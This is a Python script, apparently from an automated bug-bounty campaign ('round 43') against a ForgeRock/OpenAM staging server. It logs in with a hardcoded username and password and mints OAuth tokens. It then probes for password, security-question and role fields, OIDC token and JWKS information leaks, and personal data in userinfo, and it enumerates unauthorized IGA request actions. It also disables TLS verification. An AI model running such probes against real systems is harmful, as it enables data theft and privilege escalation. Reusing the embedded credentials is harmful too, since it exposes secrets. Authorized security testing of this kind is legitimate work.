# -*- coding: utf-8 -*-
"""AIC 第四十三轮:负空间推理 4 个未打开面
A. users 直查 _fields 敏感字段(userpassword/kbaInfo/memberOfOrgIDs/roles/authType)
B. OAuth2 .well-known / jwks / tokeninfo(端点清单与信息泄露)
C. profile scope token 的 userinfo(是否返回全名/邮箱)
D. IGA requests 创建 action 枚举(createRequest/submit/start/initiate/apply)
预期结果表:
  有信号 -> _fields 返回敏感字段;tokeninfo 泄露;userinfo 返回 PII;requests 创建成功
  无信号 -> 全部封闭
"""
import requests, urllib3, json, time
from urllib.parse import quote
urllib3.disable_warnings()

BASE = 'https://openam-bug-bounty-stag.forgeblocks.com'
AUTH = BASE + '/am/json/realms/alpha/authenticate'
TOKEN_EP = BASE + '/am/oauth2/realms/alpha/access_token'
RU = 'https://openam-bug-bounty-stag.forgeblocks.com/enduser/sessionCheck.html'
USER, PASS = 'pccp', 'Agent360User$5h2!QxR'
MY_ID = 'db3d6356-61a0-4684-9eaa-c1353dfa44d9'
COOKIE_NAME = 'aa942d46ece12ce'
FORM = {'Content-Type': 'application/x-www-form-urlencoded'}

S = requests.Session()
S.trust_env = False
S.proxies = {'http': None, 'https': None}
S.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})

r = S.post(AUTH, json={}, timeout=15, verify=False)
d = r.json()
authId = d['authId']
cbs = []
for cb in d.get('callbacks', []):
    t = cb['type']
    inp = [{'name': 'IDToken1', 'value': USER}] if t == 'NameCallback' else \
          [{'name': 'IDToken2', 'value': PASS}] if t == 'PasswordCallback' else \
          [{'name': k.get('name'), 'value': k.get('value')} for k in cb.get('input', [])]
    cbs.append({'type': t, 'output': cb.get('output', []), 'input': inp, '_id': cb.get('_id')})
r2 = S.post(AUTH, json={'authId': authId, 'callbacks': cbs}, timeout=15, verify=False)
tok = r2.json().get('tokenId')
S.headers.update({'Cookie': COOKIE_NAME + '=' + tok,
                  'Accept-API-Version': 'resource=2.1, protocol=1.0'})
print('LOGIN OK')

def get_token(scope):
    p = '/am/oauth2/realms/alpha/authorize?client_id=endUserUIClient&response_type=code' \
        '&redirect_uri=%s&scope=%s&state=t' % (quote(RU, safe=''), quote(scope, safe=''))
    r = S.get(BASE + p, timeout=15, verify=False, allow_redirects=False)
    code = r.headers.get('Location', '').split('code=')[1].split('&')[0]
    r2 = S.post(TOKEN_EP, data={'grant_type': 'authorization_code', 'code': code, 'redirect_uri': RU,
                                'client_id': 'endUserUIClient'}, headers=FORM, timeout=12, verify=False)
    return r2.json().get('access_token')

print('\n=== A. users 直查 _fields 敏感字段 ===')
for flds in ['userpassword', 'kbaInfo', 'memberOfOrgIDs', 'roles,userpassword,mail',
             'userName,mail,kbaInfo,memberOfOrgIDs,authType', '*']:
    try:
        r = S.get(BASE + '/am/json/realms/root/realms/alpha/users/' + MY_ID + '?_fields=' + flds,
                  timeout=15, verify=False)
        print('_fields=%-28s -> %d %s' % (flds, r.status_code, r.text[:200].replace('\n', ' ')))
    except Exception as e:
        print('_fields=%s -> ERR %s' % (flds, str(e)[:60]))
    time.sleep(0.5)

print('\n=== B. .well-known / jwks / tokeninfo ===')
for p in ['/am/oauth2/realms/alpha/.well-known/openid-configuration',
          '/am/oauth2/realms/alpha/.well-known/openid-configuration/jwks',
          '/am/oauth2/realms/alpha/jwks',
          '/am/oauth2/realms/alpha/jwk_uri',
          '/am/oauth2/realms/alpha/connect/userinfo']:
    try:
        r = S.get(BASE + p, timeout=15, verify=False)
        txt = r.text[:300].replace('\n', ' ')
        print('%-62s -> %d %s' % (p, r.status_code, txt))
    except Exception as e:
        print('%-62s -> ERR %s' % (p, str(e)[:60]))
    time.sleep(0.5)
at = get_token('openid')
r = S.post(BASE + '/am/oauth2/realms/alpha/tokeninfo', data={'token': at}, headers=FORM,
           timeout=12, verify=False)
print('tokeninfo -> %d %s' % (r.status_code, r.text[:250].replace('\n', ' ')))

print('\n=== C. profile scope userinfo ===')
at_p = get_token('openid profile email')
r = S.get(BASE + '/am/oauth2/realms/alpha/userinfo',
          headers={'Authorization': 'Bearer ' + at_p}, timeout=12, verify=False)
print('userinfo(profile+email) -> %d %s' % (r.status_code, r.text[:300].replace('\n', ' ')))

print('\n=== D. IGA requests 创建 action 枚举 ===')
RP = '/iga/governance/user/%s/requests' % MY_ID
at_iga = get_token('openid fr:iga:*')
for act in ['createRequest', 'submit', 'start', 'initiate', 'apply', 'createAccessRequest',
            'requestAccess', 'submitRequest']:
    try:
        r = S.post(BASE + RP + '?_action=' + act,
                   json={'roles': [{'name': 'test'}]},
                   headers={'Authorization': 'Bearer ' + at_iga,
                            'Accept-API-Version': 'resource=2.1, protocol=1.0'},
                   timeout=12, verify=False)
        print('requests _action=%-18s -> %d %s' % (act, r.status_code, r.text[:120].replace('\n', ' ')))
    except Exception as e:
        print('requests _action=%-18s -> ERR %s' % (act, str(e)[:60]))
    time.sleep(0.5)
